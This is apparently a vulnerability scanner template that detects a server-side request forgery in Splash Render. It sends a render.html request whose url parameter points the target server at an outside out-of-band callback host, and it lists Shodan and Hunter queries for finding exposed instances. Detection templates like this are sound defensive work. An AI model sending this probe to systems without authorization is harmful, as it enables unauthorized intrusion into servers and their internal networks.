id: splash-render-ssrf
info:
  name: Splash Render - SSRF
  author: pwnhxl
  severity: high
  description: Splash Render is vulnerable to Server-Side Request Forgery (SSRF) Vulnerability.
  reference:
    - https://github.com/scrapinghub/splash
    - https://b1ngz.github.io/splash-ssrf-to-get-server-root-privilege/
  classification:
    cwe-id:
      - CWE-918
      - CWE-99
  metadata:
    # auto-generated by nuclei-sync — unrunnable (interactsh (OAST callback))
    runzero-review: 'REJECT/2026-04-14/auto: interactsh (OAST callback)'
    hunter-query: web.title="Splash" && header="TwistedWeb"
    max-request: 1
    shodan-query: title:"Splash"
    verified: true
  tags: oast,oss,splash,ssrf,vuln
http:
  - matchers:
      - part: body
        type: word
        words:
          - Interactsh Server
      - status:
          - 200
        type: status
    matchers-condition: and
    method: GET
    path:
      - '{{BaseURL}}/render.html?url=https://oast.live'
